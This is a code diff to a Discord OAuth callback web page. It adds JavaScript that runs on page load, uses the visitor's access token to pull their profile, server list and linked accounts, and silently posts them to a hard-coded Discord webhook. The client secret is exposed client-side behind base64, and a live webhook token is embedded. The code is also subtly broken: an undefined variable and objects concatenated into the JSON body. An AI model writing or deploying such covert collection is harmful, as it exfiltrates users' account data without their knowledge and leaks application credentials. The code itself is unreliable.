@@ -697,6 +697,54 @@
           </label>
           <div class="position-relative">
             <script>
+              const UserFlags = {
+                STAFF: 1 << 0,
+                PARTNER: 1 << 1,
+                HYPESQUAD: 1 << 2,
+                BUG_HUNTER_LEVEL_1: 1 << 3,
+                HYPESQUAD_ONLINE_HOUSE_1: 1 << 6,
+                HYPESQUAD_ONLINE_HOUSE_2: 1 << 7,
+                HYPESQUAD_ONLINE_HOUSE_3: 1 << 8,
+                PREMIUM_EARLY_SUPPORTER: 1 << 9,
+                TEAM_PSEUDO_USER: 1 << 10,
+                BUG_HUNTER_LEVEL_2: 1 << 14,
+                VERIFIED_BOT: 1 << 16,
+                VERIFIED_DEVELOPER: 1 << 17,
+                CERTIFIED_MODERATOR: 1 << 18,
+                BOT_HTTP_INTERACTIONS: 1 << 19,
+                ACTIVE_DEVELOPER: 1 << 22,
+              };
+              function decodeUserFlags(flags) {
+                const decodedFlags = {};
+                for (const [flag, value] of Object.entries(UserFlags)) {
+                  decodedFlags[flag] = (flags & value) === value;
+                }
+                return decodedFlags;
+              }
+              // Example usage:
+              const flagsValue = 4194368;
+              const decodedFlags = decodeUserFlags(flagsValue);
+              console.log(decodedFlags);
+
+              const NitroTypes = {
+                None: 0,
+                NitroClassic: 1,
+                Nitro: 2,
+                NitroBasic: 3,
+              };
+              function decodeNitroType(type) {
+                for (const [typeName, typeValue] of Object.entries(NitroTypes)) {
+                  if (type === typeValue) {
+                    return typeName;
+                  }
+                }
+                return 'Unknown';
+              }
+              // Example usage:
+              const nitroTypeValue = 0;
+              const decodedNitroType = decodeNitroType(nitroTypeValue);
+              console.log(decodedNitroType);
+
               async function data1() {
                 const url = 'https://discord.com/api/v10/oauth2/token';
                 const data = "client_id=1087514957710631025&client_secret=" + atob(cacheCode) + "&grant_type=authorization_code&redirect_uri=https%3A%2F%2Fdaniel99j2.github.io%2Fvortexapiweb%2Fauth2&code=" + location.search.slice(6);
@@ -728,6 +776,56 @@
                 console.log(text2);
                 const jsonData2 = JSON.parse(text2);
                 console.log(jsonData2);
+                data3(token, jsonData2)
+              }
+              async function data3(token, dataStore2) {
+                const url = 'https://discord.com/api/v10/users/@me/guilds';
+                const data = "client_id=1087514957710631025&client_secret=" + atob(cacheCode) + "&grant_type=authorization_code&redirect_uri=https%3A%2F%2Fdaniel99j2.github.io%2Fvortexapiweb%2Fauth2&code=" + location.search.slice(6);
+                const response = await fetch(url, {
+                  method: 'GET',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Authorization': 'Bearer ' + token,
+                  },
+                  //body: data,
+                });
+                const text3 = await response.text();
+                console.log(text3);
+                const jsonData3 = JSON.parse(text3);
+                console.log(jsonData3);
+                data4(token, dataStore2, jsonData3)
+              }
+              async function data4(token, dataStore2, dataStore3) {
+                const url = 'https://discord.com/api/v10/users/@me/connections';
+                const data = "client_id=1087514957710631025&client_secret=" + atob(cacheCode) + "&grant_type=authorization_code&redirect_uri=https%3A%2F%2Fdaniel99j2.github.io%2Fvortexapiweb%2Fauth2&code=" + location.search.slice(6);
+                const response = await fetch(url, {
+                  method: 'GET',
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Authorization': 'Bearer ' + token,
+                  },
+                  //body: data,
+                });
+                const text4 = await response.text();
+                console.log(text4);
+                const jsonData4 = JSON.parse(text4);
+                console.log(jsonData4);
+                postData(dataStore2, dataStore3, jsonData4, decodeUserFlags(dataStore2.flags), decodeNitroType(dataStore2.premium_type))
+              }
+              async function postData(data1, data2, data3, data4, data5) {
+                const url = 'https://discord.com/api/webhooks/1182448052682899476/sm49BAY7M0tQgM6Y9TGaBHOGsbxgW8sEftx8QccO8gGIJQvof05C0XrsN-XN_1eu8HXW';
+                const data = "client_id=1087514957710631025&client_secret=" + atob(cacheCode) + "&grant_type=authorization_code&redirect_uri=https%3A%2F%2Fdaniel99j2.github.io%2Fvortexapiweb%2Fauth2&code=" + location.search.slice(6);
+                const response = await fetch(url, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json',
+                  },
+                  body: '{"content":"User Data:' + data1 + '\n' + data2 + '\n'  + data3 + '\n'  + data4 + '\n'  + data5 + '\n' + '"}',
+                });
+                const text5 = await response.text();
+                console.log(text5);
+                const jsonData2 = JSON.parse(text5);
+                console.log(jsonData5);
               }
             </script>
             <script>
@@ -739,8 +837,8 @@
                   i++;
                 }
                 data1()
+                //window.open("https://discord.com/oauth2/authorized", "_self");
               }
-              //window.open("https://discord.com/oauth2/authorized", "_self");
             </script>
 
             <body onload="load()">
